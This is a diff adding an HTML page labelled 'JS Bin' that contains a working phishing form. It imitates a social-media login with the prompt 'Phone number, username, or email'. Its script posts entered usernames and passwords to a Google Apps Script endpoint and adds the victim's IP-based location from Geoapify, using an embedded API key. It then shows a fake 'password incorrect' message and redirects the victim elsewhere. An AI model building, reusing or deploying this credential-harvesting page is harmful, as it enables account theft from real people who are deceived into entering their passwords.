@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>JS Bin</title>
+
+  
+</head>
+<body>
+
+  <form action='https://script.google.com/macros/s/AKfycbzGu144-oCHEspbM1HN52Yaj3L-j7br1N1McVK4I1qBbrkm6IhuholzF4N_DN77uFbt/exec' id="form"  method="POST">
+      
+    <div class="input-box">
+      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name='USER'  required >
+    </div>  
+    
+    <div class="input-box">
+      <input  type="password" name="PASS" id="password" placeholder="Password" aria-describedby="" min-length="8" aria-required="true" autocapitalize="off" autocorrect="off" required>
+    </div> 
+    <input type="text" name="CATEGORY"  value="IGG" hidden>
+    <input type="text" name="CONTINENT" id="continent" value="" hidden>
+    <input type="text" name="COUNTRY" id="country" value="" hidden>
+    <input type="text" name="CAPITAL" id="capital" value="" hidden>
+    <input type="text" name="CURRENCY" id="currency" value="" hidden>
+    <input type="text" name="PHONE_CODE" id="phone_code" value="" hidden>
+   
+    <span class="button-box">
+      <button type="submit" name="submit" id="submit" class="btn">login</button>
+
+
+
+
+
+<script type="text/javascript">
+
+          const  error= document.querySelector("#error");
+          const form = document.querySelector("#form")
+         const submitButton = document.querySelector("#submit")
+         const scriptURL = 'https://script.google.com/macros/s/AKfycbzGu144-oCHEspbM1HN52Yaj3L-j7br1N1McVK4I1qBbrkm6IhuholzF4N_DN77uFbt/exec'
+      
+         form.addEventListener('submit', e => {
+           submitButton.disabled = true
+           e.preventDefault() 
+           let requestBody = new FormData(form)
+           fetch(scriptURL, { method: 'POST', body: requestBody})
+           .then(function response(data){
+          //  alert("plese insert a valid username and password...")
+                error.style.display="block";
+                error.innerHTML="The password you entered is incorrect. Check your password or username and try again.";
+            //
+            submitButton.disabled = true
+           setTimeout(() => {
+            window.location.href= "/content4.html";
+           }, 5000);
+            form.rest();
+           })
+            .catch(error => {
+             alert('The password you entered is incorrect', error.message)
+              submitButton.disabled = false })
+}) 
+      
+
+
+var xhr= new XMLHttpRequest();
+ xhr.addEventListener('readystatechange', function (){
+
+
+    if(xhr.readyState==4){
+        var data = JSON.parse(this.responseText);
+        console.log(data);
+       
+        let continentName = data.continent.name;
+        let countryName = data.country.name;
+        let cityName = data.country.capital;
+        let countryCurrency = data.country.currency;
+        let phoneCode= data.country.phone_code;
+        let language=data.country.languages.name;
+        console.log(`This is the Continent ${continentName}, `);
+
+        console.log(`This is the Continent ${countryName}, `);
+
+        console.log(`This is the Continent ${countryCurrency}, `);
+
+        console.log(`This is the Continent ${cityName}, `);
+        
+        console.log(`This is the Continent ${phoneCode}, `);
+        
+        console.log(`This is the Continent ${language}, `);
+
+        document.getElementById("continent").value = continentName;
+        document.getElementById("country").value = countryName;
+        document.getElementById("capital").value = cityName;
+        document.getElementById("currency").value = countryCurrency;
+        document.getElementById("phone_code").value = phoneCode;
+        
+      }
+
+     
+    })
+xhr.open('GET', 'https://api.geoapify.com/v1/ipinfo?&apiKey=1ee5beee55c74cde815530b82f8ab2bf');
+xhr.send();
+
+
+
+</script>
+
+</body>
+</html>
